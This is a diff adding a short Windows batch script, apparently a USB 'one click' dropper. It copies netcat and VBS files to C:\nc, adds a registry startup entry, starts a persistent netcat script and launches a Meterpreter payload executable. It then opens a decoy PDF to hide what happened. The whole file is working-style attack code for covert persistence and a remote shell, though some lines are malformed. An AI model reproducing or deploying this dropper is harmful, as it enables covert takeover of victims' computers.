@@ -1,0 +1,26 @@
+rem creating Usb Drive and One Click and Getting Shell
+@echo off
+/Q /D /T:7F /F:OFF /V:ON /K
+:: variables
+/min
+SET odrive=%odrive:~0,2%
+set backupcmd=xcopy /s /c /d /e /h /i /r /y
+echo off
+
+rem Copying our "netcat,vbs and exe" to C:\nc
+%backupcmd% "%drive%\nc" "C:\nc\"
+
+rem Adding Registry Startup our netcat Script
+start %drive%\startup_registry_script.vbs
+
+rem starting netcat peristent Script
+start %drive%\nc\netcat_persitent_script.vbs
+
+rem Executing meterpreter_payload
+start %drive%\nc\meterpreter_payload.exe
+
+rem showing pdf file from usb drive in all folder
+start %drive%\all\Any.pdf
+
+@echo off 
+cls
